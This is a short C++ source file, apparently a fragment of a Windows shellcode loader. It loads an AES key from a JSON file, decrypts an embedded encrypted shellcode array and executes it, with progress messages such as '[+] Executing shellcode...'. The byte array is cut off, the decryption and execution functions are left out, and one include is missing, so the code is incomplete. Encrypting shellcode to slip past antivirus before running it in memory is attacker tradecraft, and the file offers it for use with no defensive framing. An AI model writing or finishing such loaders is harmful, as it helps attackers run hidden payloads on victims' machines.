#include <iostream>
#include <vector>
#include <windows.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include "json.hpp"

// Paste the output here:
std::vector<uint8_t> encrypted_shellcode = {
    0x4F, 0x23, 0xA7, 0x5D, 0x91, 0x10, 0xEF, 0x2C, ...
};

std::vector<uint8_t> load_key(const std::string& filename) {
    std::ifstream file(filename);
    json j;
    file >> j;
    return j["aes_key"].get<std::vector<uint8_t>>();
}

// (decryption and execution functions stay the same)

int main() {
    try {
        std::vector<uint8_t> key = load_key("key.json");

        std::cout << "[+] Decrypting shellcode...\n";
        std::vector<uint8_t> shellcode = decrypt_shellcode(encrypted_shellcode, key);

        std::cout << "[+] Executing shellcode...\n";
        execute_shellcode(shellcode);
    }
    catch (const std::exception& e) {
        std::cerr << "[!] Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
